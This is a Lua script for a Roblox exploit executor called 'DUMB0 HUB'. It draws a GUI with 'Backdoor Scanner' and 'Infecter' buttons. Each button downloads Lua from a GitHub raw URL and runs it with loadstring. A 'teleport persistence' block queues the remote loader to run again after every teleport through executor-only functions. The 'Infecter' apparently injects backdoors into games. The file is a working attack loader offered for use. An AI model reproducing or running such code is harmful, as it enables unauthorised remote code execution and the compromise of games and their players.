-- [[ DUMB0 HUB - STABLE VERSION ]] --
local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
ScreenGui.Name = "Dumb0Hub"
ScreenGui.ResetOnSpawn = false

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 400, 0, 300) -- Increased Y size to fit more buttons
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Frame.Active = true
Frame.Draggable = true

local Corner = Instance.new("UICorner", Frame)
local Stroke = Instance.new("UIStroke", Frame)
Stroke.Thickness = 3
Stroke.Color = Color3.fromRGB(255, 255, 255)

local Gradient = Instance.new("UIGradient", Stroke)
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 50)), -- Neon Red
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255))  -- Neon Blue
}

-- Title Branding
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 60)
Title.BackgroundTransparency = 1
Title.Text = "DUMB0 HUB"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 32
Title.Font = Enum.Font.GothamBold

-- Scanner Button
local ScannerBtn = Instance.new("TextButton", Frame)
ScannerBtn.Size = UDim2.new(0, 320, 0, 55)
ScannerBtn.Position = UDim2.new(0.5, -160, 0.35, 0) -- Moved up slightly
ScannerBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ScannerBtn.Text = "Backdoor Scanner"
ScannerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ScannerBtn.Font = Enum.Font.GothamBold
ScannerBtn.TextSize = 18
Instance.new("UICorner", ScannerBtn)

-- Infecter Button (NEW)
local InfecterBtn = Instance.new("TextButton", Frame)
InfecterBtn.Size = UDim2.new(0, 320, 0, 55)
InfecterBtn.Position = UDim2.new(0.5, -160, 0.65, 0) -- Placed below scanner
InfecterBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
InfecterBtn.Text = "Infecter"
InfecterBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
InfecterBtn.Font = Enum.Font.GothamBold
InfecterBtn.TextSize = 18
Instance.new("UICorner", InfecterBtn)

-- Close Button
local Close = Instance.new("TextButton", Frame)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Position = UDim2.new(1, -35, 0, 5)
Close.BackgroundTransparency = 1
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 80, 80)
Close.TextSize = 22
Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- [[ SCANNER LOGIC ]] --
ScannerBtn.MouseButton1Click:Connect(function()
    ScannerBtn.Text = "Connecting..."
    local scannerUrl = "https://raw.githubusercontent.com/its-Dumb0xd/Backdoor/main/Backdoor-Scanner/scanner.lua"
    local success, content = pcall(function() return game:HttpGet(scannerUrl) end)
    
    if success and content then
        ScannerBtn.Text = "Scanning..."
        task.wait(0.5)
        loadstring(content)()
        ScannerBtn.Text = "Backdoor Scanner"
    else
        ScannerBtn.Text = "HTTP 404 ERROR"
        task.wait(2)
        ScannerBtn.Text = "Backdoor Scanner"
    end
end)

-- [[ INFECTER LOGIC ]] --
InfecterBtn.MouseButton1Click:Connect(function()
    InfecterBtn.Text = "Injecting..."
    local infecterUrl = "https://raw.githubusercontent.com/its-Dumb0xd/Backdoor/main/Infecter/infecter.lua"
    local success, content = pcall(function() return game:HttpGet(infecterUrl) end)
    
    if success and content then
        loadstring(content)()
        InfecterBtn.Text = "Infecter Active"
        task.wait(2)
        InfecterBtn.Text = "Infecter"
    else
        InfecterBtn.Text = "Error 404"
        task.wait(2)
        InfecterBtn.Text = "Infecter"
    end
end)

-- [[ TELEPORT PERSISTENCE ]] --
local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
if queueteleport then
    local mainUrl = "https://raw.githubusercontent.com/its-Dumb0xd/Backdoor/main/Main.lua"
    queueteleport("loadstring(game:HttpGet('" .. mainUrl .. "'))()")
end

print("Dumb0 Hub: Initialized Successfully")
